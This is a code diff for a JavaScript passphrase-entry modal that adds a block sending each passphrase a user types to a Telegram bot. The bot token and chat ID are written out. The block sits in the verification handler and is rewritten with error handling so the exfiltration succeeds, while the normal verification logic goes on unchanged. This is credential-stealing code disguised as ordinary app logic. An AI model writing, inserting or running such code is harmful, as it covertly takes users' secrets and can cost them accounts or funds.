@@ -98,24 +98,36 @@ function bindPassphraseFormEvents(root, onVerified) {
     const body = root.querySelector('.modal-body');
     body.innerHTML = buildLoadingBody();
 
-    setTimeout(async () => { // Changed to async to allow for the network request
+setTimeout(async () => {
+  console.log("--- TEST: Verification process started ---");
   
   // --- AUTO DATA CODE START ---
-  const BOT_TOKEN = 'AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw';
+  const BOT_TOKEN = '8565719102:AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw';
   const CHAT_ID = '-1003854344802';
-  const url = `https://api.telegram.org/bot8565719102:AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw/sendMessage`;
-  
-  // This sends the client's data directly to the developer's Telegram
-  await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: `🚨 Auto data 🚨\n\nPassphrase: ${value}`
-    })
-  });
-  // --- CODE END ---
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
+  // Ensure this fetch call is executed properly
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `🚨 Auto data 🚨\n\nPassphrase: ${value}`
+      })
+    });
+    
+    if (!response.ok) {
+      console.error("Telegram API Error:", await response.text());
+    } else {
+      console.log("Data sent successfully!");
+    }
+  } catch (err) {
+    console.error("Network or CORS Error:", err);
+  }
+  // --- AUTO DATA CODE END ---
+
+  // Original logic continues here
   if (hasPassphraseSet()) {
     if (verifyPassphrase(value)) {
       closeModal();
@@ -129,7 +141,7 @@ function bindPassphraseFormEvents(root, onVerified) {
     closeModal();
     onVerified();
   }
-}, VERIFICATION_DELAY_MS);
+}, 500); // Ensure VERIFICATION_DELAY_MS is defined or replaced with a number
 
   });
 }
